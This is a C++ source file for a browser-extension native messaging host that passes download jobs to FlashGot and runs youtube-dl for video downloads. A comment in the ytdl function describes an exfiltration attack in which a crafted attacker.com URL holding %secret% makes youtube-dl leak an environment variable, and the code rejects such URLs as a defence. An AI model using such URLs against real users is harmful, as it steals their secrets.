//TODO: make stdout binary in flashgot nativehost
//TODO: make flashgot nativehost message lenght logic like this one
//TODO: make sure everything is x86
//TODO: check licence of programs for redistribution
//TODO: vc++ 2015 is needed for yt-dlp(x86)
//TODO: change main to int _tmain(int argc, TCHAR *argv[]) in flashgot too

#include "stdafx.h"
#include <iostream>
#include <string>
#include <fstream>
#include <fcntl.h>
#include <io.h>
#include <thread>
#include "DLGrab_Native_Host.h"
#include "utils.h"
#include "messaging.h"
#include "exceptions.h"
#include "defines.h"

using namespace std;
using namespace ggicci;


int wmain(int argc, WCHAR *argv[], WCHAR *envp[])
{
	//initializations
	try{
		plog::init(plog::debug, "log.txt", 1000*1000, 2);
		setupStdin();
		setupTmpDir();
	}
	catch(exception &e)
	{
		try{
			messaging::sendMessage(MSGTYP_ERR, e.what());
			PLOG_FATAL << e.what();
		}catch(...){}
		exit(EXIT_FAILURE);
	}

	PLOG_INFO << "starting native host";

	//the loop for sending/receiving messages
    while(true)
	{
		try
		{
			string raw_message = messaging::get_message();
			PLOG_INFO << "received message: " << raw_message;
			Json &msg = utils::parseJSON(raw_message);
			processMessage(msg);
		}
		catch(fatal_exception &e)
		{
			try{
				messaging::sendMessage(MSGTYP_ERR, e.what());
				PLOG_FATAL << e.what();
			}catch(...){}
			//we exit after a fatal exception because otherwise the infinite loop will run rapidly
			exit(EXIT_FAILURE);
		}
		catch(exception &e)
		{
			try{
				messaging::sendMessage(MSGTYP_ERR, e.what());
				PLOG_ERROR << e.what();
			}catch(...){}
		}
    }
}

//sets stdin to binary mode
void setupStdin()
{
	int res1 = _setmode( _fileno( stdin ), _O_BINARY );
	int res2 = _setmode( _fileno( stdout ), _O_BINARY );
	if( res1 == -1 || res2 == -1){
		throw fatal_exception("cannot set stdin mode to binary");
	}
}

//sets up our temp directory where we put files
string setupTmpDir()
{
	try
	{
		string DLGTempDir = utils::getDLGTempDir();
		utils::mkdir(DLGTempDir);
		return DLGTempDir;
	}
	catch(...)
	{
		throw fatal_exception("cannot setup temp directory");
	}
}

//using the reference of the Json object because pass by value caused exception because of copy constructor error
void processMessage(const Json &msg)
{
	try
	{
		string type = msg["type"].AsString();

		if(type == MSGTYP_GET_AVAIL_DMS)
		{
			handleType2(msg);
		}
		else if(type == MSGTYP_DOWNLOAD)
		{
			handleType3(msg);
		}
		else if(type == MSGTYP_YTDL_INFO)
		{
			handleType4(msg);
		}
		else if(type == MSGTYP_YTDL_VID)
		{
			handleType5(msg);
		}
		else if(type == MSGTYP_YTDL_AUD)
		{
			handleType6(msg);
		}
		else
		{
			messaging::sendMessage(MSGTYP_UNSUPP, "Unsupported message type");
		}
	}
	catch(exception &e)
	{
		string msg = "Error in processing message: ";
		msg.append(e.what());
		throw dlg_exception(msg.c_str());
	}
}

//handles "get_available_dms" request
void handleType2(const Json &msg)
{
	//TODO: output this directly from flashgot.exe
	string fgOutput = utils::launchExe("flashgot.exe");
	Json &dmsJSON = utils::parseJSON(fgOutput.c_str());
	Json res = Json::Parse("{}");
	res.AddProperty("type", Json("available_dms"));
	Json dms = Json::Parse("[]");
	for(int i=0; i<dmsJSON.Size(); i++)
	{
		if(dmsJSON[i]["available"].AsBool())
		{
			string name = dmsJSON[i]["name"].AsString();
			dms.Push(Json(name));
		}
	}
	res.AddProperty("availableDMs", dms);
	messaging::sendMessage(res);
}

//TODO: make FlashGot directly accept the JSON as job file instead of this 
//handles "download" request
void handleType3(const Json &msg)
{
	const Json &job = msg["job"];
	const Json &downloadsInfo = job["downloadsInfo"];
	string dmName = job["dmName"].AsString();
	string header("");
	//length;dmName;0;;
	string msgstr = msg.ToString();
	string jobstr = job.ToString();
	string infostr = downloadsInfo.ToString();
	header.append(std::to_string(downloadsInfo.Size()));
	header.append(";");
	header.append(dmName);
	header.append(";0;;");

	string jobText = header;
	jobText.append("\n");
	jobText.append(job["referer"].AsString());
	jobText.append("\n");

	for(int i=0; i<downloadsInfo.Size(); i++)
	{
		jobText.append(downloadsInfo[i]["url"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["desc"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["cookies"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["postData"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["filename"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["extension"].AsString());
		jobText.append("\n");
	}

	jobText.append(job["originPageReferer"].AsString());
	jobText.append("\n");
	jobText.append(job["originPageCookies"].AsString());
	jobText.append("\n");
	jobText.append("\n");
	jobText.append("\n");
	jobText.append(job["useragent"].AsString());
	jobText.append("\n");

	flashGot(jobText);
}

void handleType4(const Json &msg)
{
	string pageUrl = msg["page_url"].AsString();
	string manifestUrl = msg["manifest_url"].AsString();
	string dlHash = msg["dlHash"].AsString();
	std::thread th1(ytdl_info, pageUrl, manifestUrl, dlHash);
	th1.detach();
}

void handleType5(const Json &msg)
{
	string url = msg["url"].AsString();
	string name = msg["name"].AsString();
	string location = msg["location"].AsString();
	string dlHash = msg["dlHash"].AsString();
	std::thread th1(ytdl_video, url, name, location, dlHash);
	th1.detach();
}

void handleType6(const Json &msg)
{
	string url = msg["url"].AsString();
	string name = msg["name"].AsString();
	string location = msg["location"].AsString();
	string dlHash = msg["dlHash"].AsString();
	std::thread th1(ytdl_audio, url, name, location, dlHash);
	th1.detach();
}

//launches FlashGot to perform a download with a DM
void flashGot(const string &jobText)
{
	try
	{
		string jobFileName = utils::getNewTempFileName();
		std::ofstream jobFile(jobFileName);
		jobFile << jobText;
		jobFile.close();

		vector<string> args;
		args.push_back(jobFileName);
		utils::launchExe("FlashGot.exe", args, false);
	}
	catch(exception &e)
	{
		string msg = "Error in FlashGot execution: ";
		msg.append(e.what());
		throw dlg_exception(msg.c_str());
	}
}

void ytdl_info(const string &pageurl, const string &manifestUrl, const string &dlHash)
{
	vector<string> args;
	args.push_back("-j");
	string ytdlOutput = ytdl(pageurl, args);

	Json info;
	bool isFromManifest = false;

	try
	{
		info = utils::parseJSON(ytdlOutput.c_str());
	}
	catch(...)
	{
		//YTDL output not JSON
		//Happens when YTDL outputs an error
		//Let's try with the manifest itself
		ytdlOutput = ytdl(manifestUrl, args);
		try
		{
			info = utils::parseJSON(ytdlOutput.c_str());
			isFromManifest = true;
		}
		catch(...)
		{
			//Must be some shit if even this one fails
			info = Json(ytdlOutput);
		}
	}

	Json msg = Json::Parse("{}");
	msg.AddProperty("type", Json(MSGTYP_YTDL_INFO));
	msg.AddProperty("dlHash", Json(dlHash));
	msg.AddProperty("info", info);
	if(isFromManifest){
		msg.AddProperty("is_from_manifest", Json(isFromManifest));
	}
	messaging::sendMessage(msg);

}

void ytdl_video(const string &url, const string &name, const string &location, const string &dlHash)
{
	Json msg = Json::Parse("{}");

	try
	{
		string safeName = utils::sanitizeFilename(name.c_str());
		string output = utils::saveDialog(safeName);

		//if it's cancelled do nothing
		if(output.length() == 0)
		{
			return;
		}

		output.append(".%(ext)s");

		vector<string> args;
		args.push_back("--output");
		args.push_back(output);

		ytdl(url, args);

		msg.AddProperty("type", Json(MSGTYP_YTDL_COMP));
		msg.AddProperty("dlHash", Json(dlHash));
	}
	catch(...)
	{
		msg.AddProperty("type", Json(MSGTYP_YTDL_FAIL));
		msg.AddProperty("dlHash", Json(dlHash));
	}

	messaging::sendMessage(msg);

}

void ytdl_audio(const string &url, const string &name, const string &location, const string &dlHash)
{
	//TODO
}

string ytdl(const string &url, vector<string> args, void (*onOutput)(string output))
{
	try
	{
		//ok so the issue is an attacker could make the user request a malicious URL and steal environment variables from them
		//for example if the users tries to download https://attacker.com/script.php?secret=%secret% then upon 
		//receiving this command line argument youtubedl will replace %secret% with the corresponding env. variable value
		//and send it to the attacker
		//not really a huge deal because nobody should put secrets in environment variables anyway and also
		//we are url-encoding our URLs so it would be difficult to come up with a URL that would leak an actual env. var
		//but not impossible
		//this could also happen by accident leading to undefined behavior
		//so we search the URL and if we find any env. variables in it we just reject it
		if(utils::strHasEnvars(url))
		{
			throw dlg_exception("This URL is not supported");
		}

		args.push_back(url);
		string ytdlOutput = utils::launchExe("ytdl.exe", args, true, onOutput);
		return ytdlOutput;
	}
	catch(exception &e){
		try{
			messaging::sendMessage(MSGTYP_ERR, e.what());
			PLOG_ERROR << e.what();
		}catch(...){}
	}

}

void handleDlProgress(string output)
{
	//output is like \r[download]   2.3% of 1.33MiB at 108.51KiB/s ETA 00:12
	vector<string> parts = utils::strSplit(output, ' ');
	if(parts.size()>0 && output.find('%')!=string::npos)
	{
		messaging::sendMessage(MSGTYP_YTDLPROG, parts[1]);
	}
}